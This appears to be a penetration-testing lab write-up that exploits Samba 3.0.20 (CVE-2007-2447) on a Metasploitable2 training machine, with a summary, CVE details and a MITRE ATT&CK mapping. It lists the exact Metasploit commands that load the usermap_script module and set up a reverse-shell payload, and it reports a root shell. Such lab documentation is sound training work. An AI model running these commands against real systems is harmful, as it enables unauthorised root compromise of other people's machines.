# Samba Remote Code Execution (CVE-2007-2447)

# Summary
This exploit targets a misconfigured Samba service (version 3.0.20) on Metasploitable2. By injecting commands via the `username map script` feature, an attacker can execute arbitrary commands on the system with root privileges.

# Tools Used
- Metasploit Framework

# Steps Performed

1. Started Metasploit:
   ```bash
   msfconsole

2. Loaded the module:
    use exploit/multi/samba/usermap_script

3. Set target IP and payload:
    set RHOSTS 192.168.6.3
    set PAYLOAD cmd/unix/reverse
    set LHOST 192.168.6.4
    set LPORT 4444
    run

4. Shell opened(See screenshot)

# Outcome
Root shell obtained on target

Fully compromised machine

# CVE Details
CVE: CVE-2007-2447

Vulnerable version: Samba 3.0.20

Misconfiguration: Insecure username map script parameter

Impact: Remote command execution as root

# MITRE ATT&CK Mapping

T1210: Exploitation of Remote Services

T1021.002: SMB/Windows Admin Shares
